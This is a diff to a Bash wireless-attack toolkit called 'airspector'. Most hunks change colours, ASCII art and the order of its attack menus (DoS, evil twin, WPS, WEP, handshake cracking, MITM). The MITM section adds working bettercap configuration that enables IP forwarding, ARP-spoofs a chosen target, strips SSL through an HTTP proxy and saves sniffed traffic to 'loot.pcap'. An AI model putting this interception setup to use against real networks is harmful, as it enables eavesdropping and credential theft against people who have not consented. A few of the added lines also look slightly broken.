@@ -482,7 +482,7 @@ function download_language_strings_file() {
 function language_strings_handling_messages() {
 
 	declare -gA language_strings_exiting
-	language_strings_exiting["ENGLISH"]="Exiting airspector script  - See you soon! :)"
+	language_strings_exiting["ENGLISH"]="Exiting airspector script  "
 
 
 	declare -gA language_strings_key_to_continue
@@ -678,7 +678,7 @@ function generate_dynamic_line() {
 		else
 			ncharstitle=78
 		fi
-		titlechar="▰"
+		titlechar="${white_color}▰"
 	elif [ "${type}" = "separator" ]; then
 		ncharstitle=58
 		titlechar="-"
@@ -2419,7 +2419,7 @@ function select_interface() {
 	echo ""
 	current_menu="select_interface_menu"
 	language_strings "${language}" 24 "red"
-	print_large_separator
+	
 	ifaces=$(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v)
 	option_counter=0
 	for item in ${ifaces}; do
@@ -2429,14 +2429,14 @@ function select_interface() {
 		else
 			spaceiface=" "
 		fi
-		echo -ne "${option_counter}.${spaceiface}${cyan_color}${item} "
+		echo -ne "[${option_counter}] "
 		set_chipset "${item}"
 		if [ "${chipset}" = "" ]; then
 			language_strings "${language}" 245 "blue"
 		else
 			interface_menu_band=""
 			if check_interface_wifi "${item}"; then
-				interface_menu_band+="${green_color} ▰▰ ${pink_color}"
+				interface_menu_band+="${green_color} ${pink_color}"
 				get_5ghz_band_info_from_phy_interface "$(physical_interface_finder "${item}")"
 				case "$?" in
 					"1")
@@ -2449,9 +2449,9 @@ function select_interface() {
 			fi
 
 			if [ "${is_rtl_language}" -eq 1 ]; then
-				echo -e " ${green_color}▰▰ ${normal_color}${chipset} ${yellow_color}Chipset:${interface_menu_band}${white_color}"
+				echo -e "${normal_color}${chipset} ${yellow_color}${interface_menu_band}${spaceiface}${cyan_color}[${yellow_color}${item}${blue_color}]${white_color}"
 			else
-				echo -e " ${green_color}${blue_color}Chipset:${interface_menu_band}${white_color} ${chipset}"
+				echo -e " ${blue_color}${interface_menu_band}${white_color} ${chipset}${spaceiface}${cyan_color}[${yellow_color}${item}${blue_color}]${white_color}"
 			fi
 		fi
 	done
@@ -5854,28 +5854,26 @@ function main_menu() {
 	debug_print
 
 	clear
-	language_strings "${language}" 101 "title"
 	current_menu="main_menu"
 	initialize_menu_and_print_selections
 	echo
 	language_strings "${language}" 47 "green"
 	print_large_separator
-	language_strings "${language}" 61 "blue"
-	language_strings "${language}" 48 "blue"
-	language_strings "${language}" 55 "blue"
-	language_strings "${language}" 56 "blue"
-	print_large_separator
-	language_strings "${language}" 118 "blue"
-	language_strings "${language}" 119 "blue"
-	language_strings "${language}" 169 "blue"
-	language_strings "${language}" 252 "blue"
-	language_strings "${language}" 333 "blue"
-	language_strings "${language}" 426 "blue"
-	language_strings "${language}" 57  "blue"
-	language_strings "${language}" 60 "blue"
-	language_strings "${language}" 721 "blue"
-	print_large_separator "yellow"
-	language_strings "${language}" 722 "blue"
+	language_strings "${language}" 722 "blue" #0
+	language_strings "${language}" 56 "blue" #1
+	language_strings "${language}" 55 "blue" #2
+	language_strings "${language}" 48 "blue" #3
+	
+	language_strings "${language}" 118 "blue" #4
+	language_strings "${language}" 252 "blue" #5
+	language_strings "${language}" 426 "blue" #6
+	language_strings "${language}" 333 "blue" #7
+	language_strings "${language}" 119 "blue" #8
+	language_strings "${language}" 169 "blue" #9
+	language_strings "${language}" 717 "blue" #10
+	language_strings "${language}" 721 "blue" #11
+	
+	language_strings "${language}" 61 "blue" #12
 	print_large_separator
 	
 	
@@ -5884,46 +5882,44 @@ function main_menu() {
 	read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" main_option
 	case ${main_option} in
 		0)
-			exit_script_option
+			Network-Manager-restart
 		;;
 		1)
-			select_interface
+			managed_option "${interface}"
 		;;
 		2)
 			monitor_option "${interface}"
 		;;
 		3)
-			managed_option "${interface}"
+			select_interface
 		;;
 		4)
 			dos_attacks_menu
 		;;
 		5)
-			handshake_pmkid_tools_menu
-		;;
-		6)
-			decrypt_menu
-		;;
-		7)
 			evil_twin_attacks_menu
 		;;
-		8)
-			wps_attacks_menu
-		;;
-		9)
+		6)
 			wep_attacks_menu
 		;;
+		7)
+			wps_attacks_menu
+		;;
+		8)
+			handshake_pmkid_tools_menu
+		;;
+		9)
+			decrypt_menu
+		;;
 		10)
-			enterprise_attacks_menu
+			#enterprise_attacks_menu
+			tools_menu
 		;;
 		11)
-			tools_menu 
+			 MITM_Attacks
 		;;
 		12)
-			MITM_Attacks
-		;;
-		13)
-			Network-Manager-restart
+			exit_script_option	
 		;;
 		*)
 			invalid_menu_option
@@ -6595,6 +6591,7 @@ then
 	elif [[ "$MITMCH" = "33" ]]
 	then
 		clear
+		route -n
 		echo -e "Enter your gateway(prefer "$ETH" gateway):"
 		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" GATENM
 		echo -e ""
@@ -6704,20 +6701,45 @@ then
 		echo -e "Enter your target IP:"
 		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" TARGIP
 	elif [[ "$MITMSET" = "3" ]]
-	then
-		export PAKTC
-		export GATEINT
-		export TARGIP
-		export GATENM
-		cd "$LPATH"/ls
-		gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
-		gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
-	#~ elif [[ "$MITMSET" = "4" ]]
-	#~ then
-		#~ service apache2 start
-	#~ elif [[ "$MITMSET" = "d4" ]]
-	#~ then
-		#~ service apache2 stop
+	then	echo 1 > /proc/sys/net/ipv4/ip_forward
+cat <<EOF > sniffconff.cap
+events.stream off
+net.probe on
+net.show
+set ticker.period 10
+set ticker.command "net.show"
+ticker on 
+EOF
+		
+		sleep 1
+		xterm -geometry 150x80+999999+0 -hold -e  bettercap -iface $interface -caplet sniffconff.cap &
+		
+		read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" Target_ip
+		
+cat <<EOF > sniffconf.cap
+set net.sniff.local true
+set net.sniff.output loot.pcap
+set arp.spoof.fullduplex true
+set http.proxy.sslstrip true
+events.ignore endpoint.new
+events.ignore endpoint.lost
+http.proxy on
+arp.spoof on
+net.sniff on
+net.probe on
+net.recon off
+EOF
+		
+		clear
+		sleep 0.2
+		printf "\n${red}[*] ${lightred}Starting Bettercap as sniffer on ${interface}...\n\n${cyan}"
+		sleep 1
+		xterm -geometry 160x80+0+0 -hold -e  bettercap -iface $interface -caplet sniffconf.cap -eval "set arp.spoof.targets ${Target_ip}"
+		
+		
+	
+
+		
 	elif [[ "$MITMSET" = "4" ]]
 	then
 		echo -e "Clone a website to one of the following IP(s):"
@@ -6916,6 +6938,8 @@ function evil_twin_attacks_menu() {
 	language_strings "${language}" 396
 	language_strings "${language}" 262 "separator"
 	language_strings "${language}" 263 et_captive_portal_dependencies[@]
+	language_strings "${language}" 723 "separator"
+	language_strings "${language}" 57 "blue"
 	
 
 	read -rp "$(echo -e "${blue_color}[${green_color}Airspector${blue_color}]-${blue_color}$")" et_option
@@ -7083,8 +7107,8 @@ function evil_twin_attacks_menu() {
 				fi
 			fi
 		;;
-		*)
-			invalid_menu_option
+		10)
+			enterprise_attacks_menu
 		;;
 	esac
 
@@ -14865,8 +14889,8 @@ function time_loop() {
 	debug_print
 
 	echo -ne " "
-	for (( j=1; j<=4; j++ )); do
-		echo -ne "${green_color}▰" 
+	for (( j=1; j<=1; j++ )); do
+		echo -ne "${green_color}" 
 		sleep 0.015
 		
 	done
@@ -15635,20 +15659,10 @@ function check_if_kill_needed() {
 function general_checkings() {
 
 	debug_print
-
+	
 	compatible=0
 	check_if_kill_needed
 
-	if [ "${distro}" = "Unknown Linux" ]; then
-		non_linux_os_check
-		echo -e "${red_color}${distro}${normal_color}"
-	else
-		if [ "${is_docker}" -eq 1 ]; then
-			echo -e "${red_color}${distro} Linux ${pink_color}(${docker_image[${language}]})${normal_color}"
-		else
-			echo -e "${red_color}${distro} Linux${normal_color}"
-		fi
-	fi
 
 	check_compatibility
 	if [ "${compatible}" -eq 1 ]; then
@@ -15714,14 +15728,12 @@ function print_known_distros() {
 function check_compatibility() {
 
 	debug_print
-
 	if ! "${AIRSPECTOR_SILENT_CHECKS:-false}"; then
 		echo
 		language_strings "${language}" 108 "green"
-		language_strings "${language}" 115 "read"
+		
 
-		echo
-		language_strings "${language}" 109 "blue"
+		
 	fi
 
 	essential_toolsok=1
@@ -15733,9 +15745,9 @@ function check_compatibility() {
 				echo -ne "${red_color} Error${normal_color}"
 				essential_toolsok=0
 				echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
-				echo -e "\r"
+				
 			else
-				echo -e "${yellow_color} Installed\r${normal_color}"
+				echo -ne "${yellow_color} [ok]${normal_color}"
 			fi
 		else
 			if ! hash "${i}" 2> /dev/null; then
@@ -15744,10 +15756,7 @@ function check_compatibility() {
 		fi
 	done
 
-	if ! "${AIRSPECTOR_SILENT_CHECKS:-false}"; then
-		echo
-		language_strings "${language}" 218 "blue"
-	fi
+	
 
 	optional_toolsok=1
 	for i in "${!optional_tools[@]}"; do
@@ -15774,13 +15783,13 @@ function check_compatibility() {
 					optional_toolsok=0
 				else
 					if ! "${AIRSPECTOR_SILENT_CHECKS:-false}"; then
-						echo -e "${yellow_color} Installed\r${normal_color}"
+						echo -ne "${yellow_color} [ok]${normal_color}"
 					fi
 					optional_tools[${i}]=1
 				fi
 			else
 				if ! "${AIRSPECTOR_SILENT_CHECKS:-false}"; then
-					echo -e "${yellow_color} Installed\r${normal_color}"
+					echo -ne "${yellow_color} [ok]${normal_color}"
 				fi
 				optional_tools[${i}]=1
 			fi
@@ -15791,8 +15800,8 @@ function check_compatibility() {
 	if "${AIRSPECTOR_AUTO_UPDATE:-true}"; then
 
 		if ! "${AIRSPECTOR_SILENT_CHECKS:-false}"; then
-			echo
-			language_strings "${language}" 226 "blue"
+			echo -n ""
+			
 		fi
 
 		for i in "${update_tools[@]}"; do
@@ -15805,7 +15814,7 @@ function check_compatibility() {
 					echo -ne " (${possible_package_names_text[${language}]} : ${possible_package_names[${i}]})"
 					echo -e "\r"
 				else
-					echo -e "${yellow_color} Installed\r${normal_color}"
+					echo -ne "${yellow_color} [ok]${normal_color}"
 				fi
 			else
 				if ! hash "${i}" 2> /dev/null; then
@@ -15875,18 +15884,8 @@ function check_window_size_for_intro() {
 function print_intro() {
 
 	debug_print
-
-	echo -e "${green_color}  
-░█████╗░██╗██████╗░░██████╗██████╗░███████╗░█████╗░████████╗░█████╗░██████╗░
-██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
-███████║██║██████╔╝╚█████╗░██████╔╝█████╗░░██║░░╚═╝░░░██║░░░██║░░██║██████╔╝
-██╔══██║██║██╔══██╗░╚═══██╗██╔═══╝░██╔══╝░░██║░░██╗░░░██║░░░██║░░██║██╔══██╗
-██║░░██║██║██║░░██║██████╔╝██║░░░░░███████╗╚█████╔╝░░░██║░░░╚█████╔╝██║░░██║
-╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚══════╝░╚════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝ ${normal_color}"
-	echo
-	language_strings "${language}" 228 "blue"
+	eval "sudo ./distro_info.sh --ascii_distro darkos"
 	
-	Ascii_art
 	sleep 2
 }
 
@@ -15894,39 +15893,21 @@ function print_intro() {
 function Ascii_art() {
 
 	debug_print
-	echo -e "⠀
-		${yellow_color}⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢀⣀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣷⡀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣄⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣆⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣶⣤⣙⣿⣿⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⣿⣿⡿⠿⠿⠿⠿⠗⠶⠶⠶⠤⢤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠖⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠓⠦⣤⣤⢤⡞⢦⠀⠀⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢦⡀⠈⢧⡀⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⢀⣄⢀⣴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⠀⠱⣄⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⣾⠈⠉⠀⠻⡷⠀⠀⣠⠖⠚⠉⠉⠉⠉⠓⢦⡀⠀⠀⠀⠀⠀⡤⠚⠉⠉⠉⠉⠑⠢⣄⠀⠈⢧⠀⠈⢳⡀⠀⠀
-	⠀⠀⠀⠀⠀⢰⠇⠀⠀⠀⠀⡇⢠⡞⠀⠀⠀⠀⢀⡀⠀⠀⠀⢹⠀⠀⠀⠀⢸⠁⠀⠀⡤⠀⠀⠀⠀⠈⣇⠀⠸⡆⠀⠀⢻⡄⠀
-	⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⡇⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⠈⠣⣀⠀⠀⠀⠀⠀⠀⣠⠇⠀⠀⡇⠀⠀⠀⢿⠀
-	⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⡇⠀⠙⠲⢤⣀⣀⣀⣀⠤⠖⠋⠀⣀⡴⠚⠓⠢⣄⡈⠙⠒⠒⠒⠒⠋⠁⠀⠀⢸⠃⠀⠀⠀⢸⡆
-	⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠴⠚⢥⡀⠀⠀⠀⡀⠙⠓⠒⠶⠦⢤⡄⠀⠀⣠⡏⠀⠀⠀⠀⢸⡇
-	⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⢀⣤⠶⠒⠚⠋⠉⠁⠀⠀⠀⠁⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⣇⢀⡴⠋⠀⠀⠀⠀⠀⣸⠃
-	⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⢸⣧⡀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣄⠀⠀⠀⠀⠀⢀⡟⠀
-	⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠘⡏⠉⠳⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⢀⡾⠁⠀
-	⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⣠⠞⠀⠀⠀
-	⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⢻⡏⠀⠀⠀⠀
-	⠀⠀⠀⢻⡀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠹⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠟⠁⠀⢷⠀⠀⠀⠀
-	⠀⠀⠀⠀⠙⠦⣤⣄⣀⠀⠘⠁⠀⠀⠀⠀⠀⠙⠲⠦⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣤⠴⠚⠉⠀⠀⠀⠀⠈⣇⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀
-	⣠⣀⣀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
-	⢳⡀⠈⠙⠲⢤⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀
-	⠀⠙⢦⡀⠀⠀⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
-	⠀⠀⠀⠙⠶⣄⡀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠁⠀⠀⠀
-	⠀⠀⠀⠀⠀⠈⠙⠲⢤⣹⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⣳⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⢾⡋⠀⠀⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠊⠁⠀⠈⠙⠲⠦⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣤⠴⠖⠛⠉⠀⠀⠉⠳⣄⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⢀⡔⠁⠀⠀⢀⠀⠀⠀⠀⢀⠀⠀⠈⢻⠉⠉⠉⠉⠉⠉⢹⠉⠉⠀⠀⡀⠀⠀⠀⠀⢠⡀⠀⠈⢧⡀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⠟⠒⠒⠒⠛⠙⣄⠀⣀⡴⠛⠳⢤⣀⡀⣧⠀⠀⠀⠀⠀⢸⡀⣀⣠⠴⠛⠦⣄⠀⢀⡏⠉⠙⠒⠶⠇⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
+	echo -e "${yellow_color} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣗⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⡟⠹⣿⣿⣿⣿⣿⣷⡷⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⠏⠀⠀⠹⣿⣿⣿⣿⣿⣿⣞⡄⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣮⡄⠀⠀⠀⠀
+⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
+⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣄⠀⠀
+⠀⣰⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⡆⠀⠀⠰⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣯⣆⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⠀⠈⠻⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⡿⠋⠀
+⠀⠀⠀⠘⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠋⠀⠀⠀"
 	
 	
 }
@@ -16395,15 +16376,19 @@ function initialize_colors() {
 
 	normal_color="\e[1;0m"
 	green_color="\033[1;32m"
+	darkgreen_color="\e[38;5;46"
 	green_color_title="\033[0;32m"
 	red_color="\033[1;91m"
 	red_color_slim="\033[0;031m"
 	blue_color="\033[1;34m"
 	cyan_color="\033[1;36m"
+	lightcyan_color="\e[38;5;45m"
 	brown_color="\033[0;33m"
 	yellow_color="\033[1;33m"
-	pink_color="\033[1;35m"
+	pink_color="\e[38;5;198m"
 	white_color="\e[1;97m"
+	bink_color="\e[0;5m"
+	unblink_color="\e[0;25m"
 }
 
 #Kill tmux session started by AIRSPECTOR
@@ -17282,7 +17267,6 @@ function main() {
 
 		
 		echo
-		language_strings "${language}" 9 "green"
 		general_checkings
 		language_strings "${language}" 115 "read"
 
